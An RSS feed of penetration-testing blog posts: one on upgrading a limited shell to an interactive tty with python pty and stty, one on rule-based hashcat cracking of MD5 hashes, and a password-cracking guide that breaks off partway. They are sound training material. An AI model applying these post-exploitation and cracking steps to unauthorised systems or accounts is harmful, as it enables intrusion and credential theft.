@@ -1,0 +1,1606 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Penetration Testing Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/category/penetration-testing/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/category/penetration-testing/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Mon, 06 Apr 2020 12:14:36 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>Penetration Testing Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/category/penetration-testing/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Spawning Interactive Reverse Shell</title>
+		<link>https://www.armourinfosec.com/spawning-interactive-reverse-shell/</link>
+					<comments>https://www.armourinfosec.com/spawning-interactive-reverse-shell/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Fri, 03 Apr 2020 09:58:59 +0000</pubDate>
+				<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Penetration Testing]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25836</guid>
+
+					<description><![CDATA[<p>Often during pentests, you have a non-tty-shell there are certain commands and stuff you can&#8217;t do. This can happen if you...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/spawning-interactive-reverse-shell/">Spawning Interactive Reverse Shell</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Often during pentests, you have a <strong>non-tty-shell</strong> there are certain commands and stuff you can&#8217;t do. This can happen if you upload reverse shells on a web server, so that the shell you get is by the user www-data, or similar. These users are not meant to have shells as they don&#8217;t interact with the system as humans do. So if you don&#8217;t have a<strong> tty-shell</strong> you can&#8217;t run <strong><code>su</code></strong>, <strong><code>sudo</code></strong> etc. This can be annoying if you manage to get a root password but you can&#8217;t use it. Here are some commands which will allow you to spawn a <strong>tty shell</strong>. Obviously some of this will depend on the system environment and installed packages. So, let&#8217;s start with Spawning Interactive Reverse Shell.</p>
+<h2><strong>Shell Spawning</strong></h2>
+<p id="method-1-python-pty-module">Python pty Module</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:default highlight:0 decode:true">python -c 'import pty; pty.spawn("/bin/sh")'</pre>
+<p>Perl</p>
+<pre class="toolbar:2 show-lang:2 striped:false nums:false lang:default highlight:0 decode:true">perl -e 'exec "/bin/sh";'
+</pre>
+<h3>Simple Shells to Fully Interactive TTYs</h3>
+<p>1. Python to spawn a PTY</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:default highlight:0 decode:true">$ python -c 'import pty; pty.spawn("/bin/bash")'
+        or
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+</pre>
+<p>2. Put the shell in to background with Ctrl-Z</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:default highlight:0 decode:true">$ Ctrl-Z</pre>
+<p>3. Examine the current terminal and STTY info and match it</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:default highlight:0 decode:true"># echo $TERM
+# stty -a</pre>
+<p>The information needed is the TERM type (<em>“xterm-256color”</em>) and the size of the current TTY (<em>“rows 37; columns 146”</em>)</p>
+<p>4. Set the current STTY to type raw and tell it to echo the input characters</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:default highlight:0 decode:true"> # stty raw -echo</pre>
+<p>5. Foreground the shell with fg and re-open the shell with reset</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:default highlight:0 decode:true"># fg
+   reset</pre>
+<p>6. stty size to match our current window</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:default highlight:0 decode:true">$ export SHELL=bash
+$ export TERM=xterm256-color
+$ stty rows 37 columns 146
+$ bash -i</pre>
+<p>7. Set PATH TERM and SHELL if missing</p>
+<pre class="toolbar:2 striped:false nums:false show-plain:3 lang:default highlight:0 decode:true">$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+$ export TERM=xterm
+$ export SHELL=bash
+$ cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
+$ export PS1='[\u@\h \W]\$ '</pre>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/spawning-interactive-reverse-shell/">Spawning Interactive Reverse Shell</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/spawning-interactive-reverse-shell/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Performing Rule Based Attack Using Hashcat</title>
+		<link>https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/</link>
+					<comments>https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Wed, 19 Feb 2020 08:25:22 +0000</pubDate>
+				<category><![CDATA[Ethical Hacking]]></category>
+		<category><![CDATA[Penetration Testing]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25539</guid>
+
+					<description><![CDATA[<p>Performing Rule Based Attack Using Hashcat This post will focus on Performing Rule Based Attack Using Hashcat. It&#8217;s a way...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/">Performing Rule Based Attack Using Hashcat</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<h2>Performing Rule Based Attack Using Hashcat</h2>
+<p><span class="st">This post will focus on Performing Rule Based Attack Using Hashcat. It&#8217;s a way of using a dictionary or multiple dictionaries of words in order to crack a password in Kali Linux.<br />
+</span></p>
+<h3 id="rule-based_attack" class="sectionedit1">Rule-based Attack</h3>
+<p>Recently I was writing a blog on hashcat to cracking the hashes but the blog was going long so i thought about to write another blog to explain more about hashcat attacks,so that you can easily crack the has.So the rule-based attack is one of the most complicated of all the attack modes.The reason for this is very simple.the rule-based attack is like a <strong>programming language</strong> designed for password candidate generation. It has functions to modify,cut or extend words and has conditional operators to skip some, etc.That makes it the most flexible,accurate and efficient attack.</p>
+<h3 id="why_not_stick_to_regular_expressions" class="sectionedit3">Why not stick to regular expressions</h3>
+<p>Why re-invent the wheel? Simple answer: regular expressions are too slow. Typically we have to generate <strong>1.000.000.000</strong> (or more) fresh password candidates in less than <strong>10 ms</strong> before hashing algorithms start to become idle, and then again and again, second after second. Just take a look at your GPU speed display to get an idea of it.</p>
+<h3 id="compatibility_to_other_rule_engines" class="sectionedit4">Compatibility to other rule engines</h3>
+<p>The rule-engine in hashcat was written so that all functions that share the same letter-name are 100% compatible to <a class="urlextern" title="http://www.openwall.com/john" href="http://www.openwall.com/john" rel="nofollow">John the Ripper</a> and Passwordpro rules and vice versa. Later we started to introduce some of our own functions that are not compatible. But these functions got their own letter-names to avoid conflicts.</p>
+<h3>What Are Rules and When Would I Use Them?</h3>
+<p>The first thing which comes in our mind is, What are rules  why we should use rule attack to cracking the hash.So First of all, consider the following scenario. You have a basic password wordlist containing the words below:</p>
+<pre class="">password
+mysecret
+qwerty</pre>
+<p>If you wanted to try the above passwords with the pattern &#8220;123&#8221; added to the end, your list will become:</p>
+<pre class="">password
+password123
+mysecret
+mysecret123
+qwerty
+qwerty123</pre>
+<p>If you also want to capitalise the first letter of the original words, it will now become:</p>
+<pre class="">password
+password123
+Password
+mysecret
+mysecret123
+Mysecret
+qwerty
+qwerty123
+Qwerty</pre>
+<p>Although you can type each new pattern manually for each word in your list,this will quickly get impractical with larger wordlists.</p>
+<p>Thankfully,we can express these patterns in programming terms using rules. With rules,we can create new passwords through modification of existing passwords supplied.</p>
+<p>Instead of having to write every new pattern for each password like above,we only require our original wordlist:</p>
+<pre class="">password
+mysecret
+qwerty</pre>
+<p>And a file containing the rules that express our patterns:</p>
+<pre class="">$c
+$1 $2 $3</pre>
+<p>Though much smaller, the above would produce the same outcome of words as before. Not only is this quicker than manually creating each password you want to try, your dictionary file also won’t be as large.</p>
+<p>In short, a rule-based attack allows you to express patterns which are applied to existing passwords to quickly generate new passwords to use.and crack the hashed fast and easily.</p>
+<h2>Creating Rules</h2>
+<p>Now that we can see the benefits of rules,we will now define some rules to use in our own rule-based attack. To define our own custom set of rules to use with hashcat, we need to store them in a file,like best64.rule or something you as want.</p>
+<p>In this tutorial,we will cover some of the most commonly used rule functions:</p>
+<table style="height: 360px;" width="614">
+<thead>
+<tr>
+<td width="59"><strong>Name</strong></td>
+<td width="51"><strong>Function</strong></td>
+<td width="123"><strong>Description</strong></td>
+<td width="49"><strong>Example Rule</strong></td>
+<td width="75"><strong>Input Word</strong></td>
+<td width="116"><strong>Output Word</strong></td>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td width="59">Nothing</td>
+<td width="51">:</td>
+<td width="123">Do nothing</td>
+<td width="49">:</td>
+<td width="75">p@ssW0rd</td>
+<td width="116">p@ssW0rd</td>
+</tr>
+<tr>
+<td width="59">Lowercase</td>
+<td width="51">l</td>
+<td width="123">Lowercase all letters</td>
+<td width="49">l</td>
+<td width="75">p@ssW0rd</td>
+<td width="116">p@ssw0rd</td>
+</tr>
+<tr>
+<td width="59">Uppercase</td>
+<td width="51">u</td>
+<td width="123">Uppercase all letters</td>
+<td width="49">u</td>
+<td width="75">p@ssW0rd</td>
+<td width="116">P@SSW0RD</td>
+</tr>
+<tr>
+<td width="59">Capitalize</td>
+<td width="51">c</td>
+<td width="123">Capitalize the first letter and lower the rest</td>
+<td width="49">c</td>
+<td width="75">p@ssW0rd</td>
+<td width="116">P@ssw0rd</td>
+</tr>
+<tr>
+<td width="59">Append Character</td>
+<td width="51">$X</td>
+<td width="123">Append character X to end</td>
+<td width="49">$1</td>
+<td width="75">p@ssW0rd</td>
+<td width="116">p@ssW0rd1</td>
+</tr>
+<tr>
+<td width="59">Prepend Character</td>
+<td width="51">^X</td>
+<td width="123">Prepend character X to front</td>
+<td width="49">^1</td>
+<td width="75">p@ssW0rd</td>
+<td width="116">1p@ssW0rd</td>
+</tr>
+<tr>
+<td width="59">Replace</td>
+<td width="51">sXY</td>
+<td width="123">Replace all instances of X with Y</td>
+<td width="49">ss$</td>
+<td width="75">p@ssW0rd</td>
+<td width="116">p@$$W0rd</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<h3>Writing our rule-set:</h3>
+<p>To start, we will create some rules to do basic manipulation of the characters.</p>
+<p>From the above table, we will put in our rules file the lowercase, uppercase and capitalize functions:</p>
+<pre class="">:
+l
+u
+c</pre>
+<p>The colon entry instructs hashcat to try the original word.We&#8217;ll be including this so we can compare how many passwords were cracked using unmodified passwords from the wordlist.</p>
+<p>We’ll also append to the end of the passwords the characters one to nine individually:</p>
+<pre class="">$1
+$2
+$3
+$4
+$5
+$6
+$7
+$8
+$9</pre>
+<p>To express multiple functions in a single rule, you can separate them with a space like the following:</p>
+<pre class="">$1 $2 $3 $4</pre>
+<p>In this case we are appending characters one, two and three to the end of our passwords.(i.e. the password is root it will convert to root1234 ), And if you want to append multi combination (i.e. $5 $ 5 it will be root55)</p>
+<p>You can substitute one character for another, by doing the following:</p>
+<pre class="">sXY</pre>
+<p>Where X is the character to replace and Y is the new character.</p>
+<p>For this demonstration,we will substitute the following letters for their commonly used alternatives:</p>
+<ul>
+<li>“@”  instead of “a”</li>
+<li>“3” instead of “e”</li>
+<li>“1” instead of “l”</li>
+<li>&#8220;0&#8221; instead of &#8220;o&#8221;</li>
+</ul>
+<p>To express these as rules in a hashcat file, it looks like:</p>
+<pre class="">sa@
+se3
+sl1
+sa@ se3 sl1
+sa@ se3 ss&amp;</pre>
+<p>The final rules we&#8217;ll add inserts the word &#8220;root&#8221; before and after the password:</p>
+<pre class="">^R ^o ^o ^t
+^r ^o ^o ^t
+$r $o $o $t</pre>
+<p>From the above, notice we&#8217;ve also included &#8220;Root&#8221; with a capital &#8220;R&#8221; before the password.</p>
+<p>Now that we have covered the different rules we’re going to use, make sure you have created a file called “rules” that contains the following rules</p>
+<pre class="">:
+#Lowercase
+l
+#Uppercase
+u
+#Capitalise  first character
+c
+#Add '1' to the end
+$1
+#Add '2' to the end
+$2
+#Add '3' to the end
+$3
+#Add '4' to the end
+$4
+#Add '5' to the end
+$5
+#Add '6' to the end
+$6
+#Add '7' to the end
+$7
+#Add '8' to the end
+$8
+#Add '9' to the end
+$9
+#Add '123' to the end
+$1 $2 $3
+#Substitute 'a' for '@'
+sa@
+#Substitute 'e' for '3'
+se3
+#substitute 'l' for '1'
+sl1
+#Substitute 'a' for '@', 'e' for '3', 'l' for '1'
+sa@ se3 sl1
+#Add the word 'root' to the beginning
+^R ^o ^o ^t
+#Add the word 'root' to the beginning
+^r ^o ^o ^t
+#Add the word 'root' to the end
+$r $o $o $t</pre>
+<p>The lines beginning with a &#8220;#&#8221; are used to indicate to hashcat that the line is a comments.</p>
+<h3>Running the Rule-Based Attack</h3>
+<p>Now that we have our rules file and providing you have the Root hashes and rockyou password dictionary, we are ready to start cracking the password hashes.</p>
+<p>In order to log the effectiveness of our rules, we’ll make use of hashcat&#8217;s debug commands. The debug option in hashcat works by logging a rule to a file every time it successfully cracks a password.</p>
+<p>To run our rule-based attack, we will use the following command:</p>
+<p>&nbsp;</p>
+<pre class="theme:dark-terminal lang:default decode:true ">hashcat -a 0 -m 0 target_hash/mayhem.hash  /usr/share/wordlists/rockyou.txt -r rules --debug-mode=1 --debug-file=matched.rule --force
+</pre>
+<p><img decoding="async" class="alignnone wp-image-25540 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/sort-command-for-hash.png" alt="hashcat command for rule base cracking" width="672" height="35" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/sort-command-for-hash.png 672w, https://www.armourinfosec.com/wp-content/uploads/2020/02/sort-command-for-hash-300x16.png 300w" sizes="(max-width: 672px) 100vw, 672px" /></p>
+<table style="height: 489px;" width="480">
+<tbody>
+<tr>
+<td width="225"><strong>Argument</strong></td>
+<td width="225"><strong>Meaning</strong></td>
+</tr>
+<tr>
+<td width="225">-a 0</p>
+<p>-m 0</td>
+<td width="225">&nbsp;</p>
+<p>The attack mode (Wordlist + Rule)</p>
+<p>Identify the hash as MD5.</p>
+<p>&nbsp;</td>
+</tr>
+<tr>
+<td width="225">target_hash/mayhem.hash</td>
+<td width="225">The hash file to use.</td>
+</tr>
+<tr>
+<td width="225">/usr/share/wordlists/rockyou.txt</td>
+<td width="225">The rockyou wordlist.</td>
+</tr>
+<tr>
+<td width="225">-r rules</td>
+<td width="225">Points hashcat to our rules file called “rules”.</td>
+</tr>
+<tr>
+<td width="225">&#8211;debug-mode=1</td>
+<td width="225">Writes the rule whenever it successfully cracks a password.</td>
+</tr>
+<tr>
+<td width="225">&#8211;debug-file=matched.rule</p>
+<p>&nbsp;</p>
+<p>&#8211;force</td>
+<td width="225">The name of the debug file where the matched rules are stored.Store every password when it cracked.</p>
+<p>To  run hashcat forcefully</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<p>After following the steps above, when you run the command the output will look like..</p>
+<figure id="attachment_25543" aria-describedby="caption-attachment-25543" style="width: 1344px" class="wp-caption aligncenter"><img decoding="async" fetchpriority="high" class="wp-image-25543 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack.png" alt="hashcat rule based attack" width="1344" height="702" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack.png 1344w, https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack-300x157.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack-1024x535.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/02/rulebasedattack-768x401.png 768w" sizes="(max-width: 1344px) 100vw, 1344px" /><figcaption id="caption-attachment-25543" class="wp-caption-text"><span style="color: #008000;">^This is the output just after execution of hashcat command.  <br /></span></figcaption></figure>
+<p>&nbsp;</p>
+<p><img decoding="async" class="wp-image-25542 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/rulecrackedpass.png" alt="Cracked passwords" width="552" height="701" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/rulecrackedpass.png 552w, https://www.armourinfosec.com/wp-content/uploads/2020/02/rulecrackedpass-236x300.png 236w" sizes="(max-width: 552px) 100vw, 552px" /></p>
+<p>however we do not know how many passwords each rule cracked.To find this information, this is where our debug file comes in. If we look at its contents right now&#8230;</p>
+<pre class="theme:dark-terminal lang:default decode:true">cat matched.rule
+sort matched.rule | uniq –c</pre>
+<p><img decoding="async" class="wp-image-25541 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/uniqematched.png" alt="mached rules " width="567" height="362" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/uniqematched.png 567w, https://www.armourinfosec.com/wp-content/uploads/2020/02/uniqematched-300x192.png 300w" sizes="(max-width: 567px) 100vw, 567px" /></p>
+<p><span style="color: #008000;">Matched rules in cracking<br />
+</span>So i got the output of hashes,hope this will help you to resolve queries of cracking the hash with hashcat.As previously mentioned, only the commonly used rule functions were covered in this tutorial. To view a full list of available rule functions, you can do so on the hashcat website <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack#limitations" target="_blank" rel="noopener noreferrer">here</a>.Additionally recommend you to..</p>
+<h3>Using Existing Rule Files</h3>
+<p>It is worth mentioning that hashcat contains some rule files by default.These are located in the &#8220;rules&#8221; folder of your hashcat installation:</p>
+<pre class="">ls -l /usr/share/hashcat/rules/</pre>
+<h2>Summary</h2>
+<p>In this guide, we created  and used our own custom rules in hashcat to perform a rule-based attack. We started by covering what rule-based attacks are and why they are used. We then proceeded to create our own rules and use the rockyou dictionary to crack MD5 hashes.</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/">Performing Rule Based Attack Using Hashcat</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Password Cracking with Hashcat</title>
+		<link>https://www.armourinfosec.com/password-cracking-with-hashcat/</link>
+					<comments>https://www.armourinfosec.com/password-cracking-with-hashcat/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Tue, 18 Feb 2020 11:27:30 +0000</pubDate>
+				<category><![CDATA[Ethical Hacking]]></category>
+		<category><![CDATA[Penetration Testing]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25505</guid>
+
+					<description><![CDATA[<p>Password Cracking with Hashcat Hello Friends, Today I&#8217;m going to explain the Hashcat password Cracking Tool, As I learn from...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/password-cracking-with-hashcat/">Password Cracking with Hashcat</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<h2><strong>Password Cracking with Hashcat</strong></h2>
+<p class="hh gw dj ba az gx hi hj hk hl hm hn ho hp hq hr hs">Hello Friends, Today I&#8217;m going to explain the Hashcat password Cracking Tool, As I learn from my cybersecurity classes and reading some blogs doing practices and the help of infosec boy&#8217;s able to explain it, so obviously the credits goes to <strong><a href="https://armourinfosec.com/">Armour Infosec</a></strong>. Password cracking and user account exploitation is one of the most issues in cybersecurity field. Password Cracking tools, like Hashcat and John the Ripper, Provide the potential attackers to check billions of passwords per second against Victim&#8217;s password hashes. these tools have proved to be effective in cracking passwords, recent research shows that combining deep learning techniques with these tools can produce significantly better results. Specifically, using Generative Adversarial Networks (GANs), which comprises of two neural networks, to generate high-quality password guesses can improve the existing tools to match 51%-73% more passwords than just the tools alone. This significant improvement demonstrates that this new approach using deep learning can generate numerous new pass-words that were once beyond the reach of other tools.On one hand, this is an impressive result driven by researchers of deep learning and cybersecurity, and on the other, a strong warning to the community of the increasing dangers of weak password authentication.</p>
+<p id="0250" class="hh gw dj ba az gx hi hj hk hl hm hn ho hp hq hr hs ">This blog is a reference guide for cracking, tool usage and supportive.tools that assist pentesters in password recovery (cracking). this will not be covering the installation of these tools but will include references to their proper installation, and if all else fails, Google. Updates and additions to this blog are planned yearly as advancements in cracking evolve.</p>
+<p class="hh gw dj ba az gx hi hj hk hl hm hn ho hp hq hr hs ">“Password recovery is a battle against math, time, cost, and human behavior, and much like any battle, the tactics are constantly  evolving.”</p>
+<h4><strong>Table of content</strong></h4>
+<ol>
+<li>Required Software</li>
+<li>Core Hash Cracking Knowledge</li>
+<li>Cracking Methodology</li>
+<li>Basic Cracking</li>
+<li>Dictionary / Wordlist</li>
+<li>Rules &amp; Masks</li>
+<li>Common Hash Examples</li>
+<li>Appendix
+<ol>
+<li>Online Resources</li>
+<li>Hashcat Menu</li>
+<li>Hash Cracking Benchmarks</li>
+<li>Hash Cracking Speed</li>
+</ol>
+</li>
+</ol>
+<h3>REQUIRED SOFTWARE</h3>
+<p><span style="color: #000000;">In order to follow many of the techniques in this manual, you will need to install the following software on your UNIX host. This book does not cover how to install said software and assumes you were able to follow the included links and extensive support websites.</span></p>
+<p><strong>HASHCAT v5.1.0 (or newer)</strong><br />
+<a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
+<p><strong>JOHN THE RIPPER 1.9.0-jumbo-1 (or newer)</strong><br />
+<a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">https://www.openwall.com/john/</a></p>
+<p><strong>Hashcat-utils v1.9 (or newer)</strong><br />
+<a href="https://hashcat.net/wiki/doku.php?id=hashcat_utils">https://hashcat.net/wiki/doku.php?id=hashcat_utils</a></p>
+<h5><span style="color: #000000;">Additionally you will need dictionaries/wordlists and highly recommend the below sources:</span></h5>
+<p><strong>WEAKPASS DICTIONARY</strong><br />
+<a href="https://weakpass.com/wordlist">https://weakpass.com/wordlist</a></p>
+<p><strong>CRACKSTATION DICTIONARY</strong><br />
+<a href="https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm">https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm</a></p>
+<p><strong>SKULL SECURITY WORDLISTS</strong><br />
+<a href="https://wiki.skullsecurity.org/index.php?title=Passwords">https://wiki.skullsecurity.org/index.php?title=Passwords</a></p>
+<p><strong>Throughout the manual, generic names have been given to the various inputs required in a cracking</strong><br />
+<strong>commands structure. Legend description is below:</strong></p>
+<h5><strong>COMMAND STRUCTURE LEGEND</strong><br />
+<span style="color: #000000;"><strong>hashcat</strong> = Generic representation of the various Hashcat binary names (hashcat tool)</span><br />
+<span style="color: #000000;"><strong>john</strong> = Generic representation of the John the Ripper binary names (John tool)</span><br />
+<span style="color: #000000;"><strong>#type</strong> = Hash type; which is an abbreviation in John or a number in Hashcat (hash MD5,MD4..)</span><br />
+<span style="color: #000000;"><strong>hash.txt</strong> = File containing target hashes to be cracked (Raw hash list )</span><br />
+<span style="color: #000000;"><strong>dict.txt</strong> = File containing dictionary/wordlist (password list)</span><br />
+<span style="color: #000000;"><strong>rule.txt</strong> = File containing permutation rules to alter dict.txt input</span><br />
+<span style="color: #000000;"><strong>passwords.txt</strong> = File containing cracked password results</span><br />
+<span style="color: #000000;"><strong>outfile.txt</strong> = File containing results of some functions output</span></h5>
+<p><strong>Lastly, as a good reference for testing various hash types to place into your “hash.txt” file, the below</strong><br />
+<strong>sites contain all the various hashing algorithms and example output tailored for each cracking tool:</strong></p>
+<p><strong>HASHCAT HASH FORMAT EXAMPLES</strong><br />
+<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+<p><strong>JOHN THE RIPPER HASH FORMAT EXAMPLES</strong><br />
+<a href="http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats">http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats</a><br />
+http://openwall.info/wiki/john/sample-hashes</p>
+<h3><span style="color: #800000;">CORE HASH CRACKING KNOWLEDGE-:</span></h3>
+<p><strong>ENCODING vs HASHING vs ENCRYPTING</strong><br />
+Encoding = transforms data into a publicly known scheme for usability<br />
+Hashing = one-way cryptographic function nearly impossible to reverse<br />
+Encrypting = mapping of input data and output data reversible with a key</p>
+<p><strong>CPU vs GPU</strong><br />
+CPU = 2–72 cores mainly optimized for sequential serial processing<br />
+GPU = 1000’s of cores with 1000’s of threads for parallel processing</p>
+<p><strong>CRACKING TIME = KEYSPACE / HASHRATE</strong><br />
+Keyspace: charset^length (?a?a?a?a = 95⁴ = 81,450,625)<br />
+Hashrate: hashing function / hardware power (bcrypt / GTX1080 = 13094 H/s)<br />
+Cracking Time: 81,450,625 / 13094 H/s = 6,220 seconds<br />
+*Keyspace displayed and Hashrate vary by tool and hardware used.<br />
+SALT = random data that’s used as additional input to a one-way function<br />
+ITERATIONS = the number of times an algorithm is run over a given hash</p>
+<h3>HASH IDENTIFICATION</h3>
+<blockquote><p>“there isn’t a foolproof method for identifying which hash function was used by simply looking at the hash, but there are reliable clues (i.e. $6$ sha512crypt).The best method is to know from where the hash was extracted and identify the hash function for that software”</p></blockquote>
+<p><strong>DICTIONARY/WORDLIST ATTACK</strong> = straight attack uses a precompiled list of words, phrases,<br />
+and common/unique strings and Might be genrated according to the Information gathered to attempt to match a password.</p>
+<p><strong>BRUTE-FORCE ATTACK</strong> = attempts every possible combination of a given character set, usually up<br />
+to a certain length.(work like the probability mathod to make combinations)</p>
+<p><strong>RULE ATTACK</strong> = generates permutations against a given wordlist by modifying, trimming,<br />
+extending, expanding, combining, or skipping words.</p>
+<p><strong>MASK ATTACK</strong> = a form of targeted brute-force attack by using placeholders for characters in certain<br />
+positions (<strong>i.e</strong>. <strong>?a?a?a?l?d?d</strong>).</p>
+<p><strong>HYBRID ATTACK</strong> = combines a Dictionary and Mask Attack by taking input from the dictionary and<br />
+adding mask placeholders (<strong>i.e. dict.txt ?d?d?d)</strong>.CRACKING RIG = from a basic laptop to a 64 GPU cluster, this is the hardware/ platform<br />
+on which you perform your password hash attacks.</p>
+<p><strong>EXPECTED RESULTS</strong><br />
+Know your cracking rig’s capabilities by performing benchmark testing and don’t assume you can<br />
+achieve the same results posted by forum members without using the exact same dictionary, attack plan,<br />
+or hardware setup.Cracking success largely depends on your ability to use resources efficiently and<br />
+make calculated trade-offs based on the target hash.</p>
+<p><strong>DICTIONARY/WORDLIST vs BRUTE-FORCE vs ANALYSIS</strong><br />
+Dictionaries and brute-force are not the end all be all to crack hashes.They are merely the beginning and end of an attack plan.I’ll say True mastery is everything in the middle,where analysis and information gathering of passwords,patterns, behaviors, and policiesaffords the ability to recover that last 20%. Experiment with your attacks and research and compile targeted wordlists with your new knowledge.Do not rely heavily on dictionaries because they can only help you with what is “known” and not the unknown.In realworld Analysis of target and gather information to make your own dictionary/wordlist is best way to attack and get credentials of the target easier and faster.</p>
+<p><strong>CRACKING METHODOLOGY</strong><br />
+Following is basic cracking methodology broken into steps,but the process is subject to change based on current/future target information uncovered during the cracking process.</p>
+<p><strong>1 &#8211; EXTRACT HASHES</strong><br />
+Pull hashes from target,Victim Machine,identify hashing function, and properly format output for your tool of choice.</p>
+<p><strong>2 &#8211; FORMAT HASHES</strong><br />
+Format your hashes based on your tool’s preferred method.See tool documentation for this guidance.<br />
+Hashcat,for example,on each line takes &lt;user&gt;:&lt;hash&gt; OR just the plain &lt;hash&gt;.</p>
+<p><strong>3 &#8211; EVALUATE HASH STRENGTH</strong><br />
+Using the Appendix table “Hash Cracking Speed (Slow-Fast)” assess your target hash and it’s cracking<br />
+speed.If it’s a slow hash,you will need to be more selective at what types of dictionaries and attacks<br />
+you perform.If it’s a fast hash,you can be more liberal with your attack strategy.</p>
+<p><strong>4 &#8211; CALCULATE CRACKING RIG CAPABILITIES</strong><br />
+With the information from evaluating the hash strength,baseline your cracking rig’s capabilities.<br />
+Perform benchmark testing using John The Ripper and/or Hashcat’s built-in benchmark ability on your<br />
+rig,it’s totally depends on your hardware.for example have a look..!</p>
+<p><strong>Hash Crackers/Bit Coin Miners</strong></p>
+<p><img decoding="async" class="wp-image-25518 alignright" src="https://www.armourinfosec.com/wp-content/uploads/2020/02/bitmining-300x187.png" alt="" width="366" height="228" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/02/bitmining-300x187.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/02/bitmining.png 500w" sizes="(max-width: 366px) 100vw, 366px" /></p>
+<p>&nbsp;</p>
+<p><strong>Fast Hash One</strong><br />
+• 1.536TH/s – Cost 3-5,000 dollars.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
